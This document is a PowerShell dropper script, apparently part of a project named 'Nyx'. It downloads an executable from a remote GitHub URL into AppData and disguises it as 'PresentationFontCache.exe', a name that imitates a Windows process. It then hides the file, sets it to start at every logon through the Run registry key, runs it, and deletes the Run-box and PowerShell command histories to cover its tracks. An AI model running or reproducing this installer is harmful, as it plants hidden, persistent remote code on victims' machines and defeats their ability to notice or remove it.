# Nyx - Z6V38DBP

# Create folder for Nyx
New-Item -Path "$env:APPDATA" -Name "Z6V38DBP" -ItemType Directory

# Download Nyx
Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/Z6V38DBP/Z6V38DBP.exe -OutFile "$env:APPDATA\Z6V38DBP\Z6V38DBP.exe"

# Change Nyx name
Rename-Item -Path "$env:APPDATA\Z6V38DBP\Z6V38DBP.exe" -NewName "PresentationFontCache.exe"

# Hide Nyx
$FILE=Get-Item "$env:APPDATA\Z6V38DBP\PresentationFontCache.exe" -Force
$FILE.attributes='Hidden'

# Add Nyx to startup processes
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "Z6V38DBP" `
-Value "$env:APPDATA\Z6V38DBP\PresentationFontCache.exe"

# Run Nyx
& "$env:APPDATA\Z6V38DBP\PresentationFontCache.exe"

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
